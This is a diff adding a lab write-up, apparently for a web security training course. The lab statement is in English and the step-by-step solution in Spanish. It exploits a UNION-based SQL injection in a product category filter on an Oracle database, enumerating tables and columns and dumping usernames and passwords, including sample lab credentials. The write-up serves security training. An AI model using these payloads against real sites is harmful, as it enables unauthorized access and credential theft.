@@ -1,0 +1,89 @@
+➡️ This lab contains a SQL injection vulnerability in the product category filter. 
+
+The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. 
+
+You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user. 
+
+
+🎯 SOLUCIÓN DEL LABORATORIO
+
+    1️⃣ Seleccionar FoxyProxy
+
+        En el navegador seleccionamos la opción BURP en FoxyProxy para que BurpSuite intercepte las peticiones. 
+
+    2️⃣ Abrir BurpSuite
+
+        Se abre BurpSuite y vamos a Proxy > HTTP history
+
+    3️⃣ Para determinar el numero de columnas que devuelve la consulta y cuáles contienen datos de texto, hay que realizar la siguiente request: 
+
+        · Seleccionamos una categoría, por ejemplo all
+        · En HTTP History buscamos la request y la enviamos a Repeater para modificar la request
+        · En el parámetro category, se sustituye por la siguiente inyección: 
+
+            GET /filter?category='+UNION+SELECT+'abc','def'-- HTTP/2
+
+        · Y nos devolverá lo siguiente: 
+
+            <table class="is-table-longdescription">
+                <tbody>
+                <tr>
+                    <th>abc</th>
+                    <td>def</td>
+                </tr>
+                </tbody>
+            </table>
+
+    4️⃣ El siguiente paso es recuperar la lista de tablas en la base de datos
+
+        · En category, se usa el siguiente payload: 
+
+            GET /filter?category='+UNION+SELECT+table_name,+NULL+FROM+all_tables-- HTTP/2
+            
+        · Y si todo sale bien, tiene que salir el resultado con un listado con los nombres de las tablas.
+
+        · Buscar el nombre de la tabla que contiene las credenciales. Suele ser USERS_ (seguido de caracteres aleatorios). En Oracle está en mayúsculas. 
+
+            USERS_DVVWWZ
+
+    5️⃣ Para averiguar el contenido de las columnas de la tabla, se introduce el siguiente payload (cambiando el nombre de la tabla): 
+
+        GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_DVVWWZ'-- HTTP/2
+
+        · Y nos devuelve las siguientes columnas: 
+
+            <table class="is-table-longdescription">
+                <tbody>
+                <tr>
+                    <th>EMAIL</th>
+                </tr>
+                <tr>
+                    <th>PASSWORD_HEJREG</th>
+                </tr>
+                <tr>
+                    <th>USERNAME_MJXEOD</th>
+                </tr>
+                </tbody>
+            </table>
+    
+    6️⃣ Una vez que tenemos el nombre de las columnas, es ver las credenciales usando el siguiente payload: 
+
+        '+UNION+SELECT+USERNAME_MJXEOD,+PASSWORD_HEJREG+FROM+USERS_DVVWWZ--
+
+
+        · Nos devuelve las siguientes credenciales: 
+
+            carlos
+            mxw4srp9yv2pu3daoc3x
+
+            administrator
+            dipuxw2u9czndmxop55c
+
+            wiener
+            lbp3yfyj2ljfhfkizpa7
+    
+    7️⃣ Introducimos las credenciales de administrator en la ventana de login.
